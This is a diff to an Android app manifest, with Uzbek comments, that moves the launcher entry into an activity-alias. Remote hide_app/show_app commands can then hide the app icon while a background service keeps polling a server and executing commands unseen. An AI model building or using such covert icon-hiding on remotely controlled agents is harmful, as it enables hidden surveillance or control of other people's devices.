@@ -46,9 +46,12 @@
             android:exported="true"
             android:launchMode="singleTop"
             android:windowSoftInputMode="adjustResize">
+            <!-- LAUNCHER kategoriyasi atayin bu yerda emas — pastdagi activity-alias'da.
+                 Shu tufayli ikonkani yashirish (alias'ni o'chirish) MainActivity'ning
+                 o'zini yoki fon xizmatini o'chirmaydi, faqat ilova ro'yxatidagi
+                 ikonkani yo'qotadi. -->
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
 
             <!-- Deep link: jarvis://pair?device_id=...&token=...&server=... -->
@@ -59,6 +62,24 @@
                 <data android:scheme="jarvis" android:host="pair" />
             </intent-filter>
         </activity>
+
+        <!-- Ilova ro'yxatidagi (launcher) ikonka — hide_app/show_app buyruqlari shu
+             alias'ning yoqilgan/o'chirilganini almashtiradi. O'chirilganda ikonka
+             yo'qoladi, lekin fon xizmati (AgentForegroundService) ishlashda davom
+             etadi — buyruqlar hamon qabul qilinaveradi, faqat ekranda ko'rinmaydi. -->
+        <activity-alias
+            android:name=".LauncherAlias"
+            android:targetActivity=".ui.MainActivity"
+            android:exported="true"
+            android:enabled="true"
+            android:icon="@mipmap/ic_launcher"
+            android:roundIcon="@mipmap/ic_launcher_round"
+            android:label="@string/app_name">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
 
         <!-- Background Agent Service — polls the server for commands and executes
              them; this is data sync, not a peripheral-device connection, so it
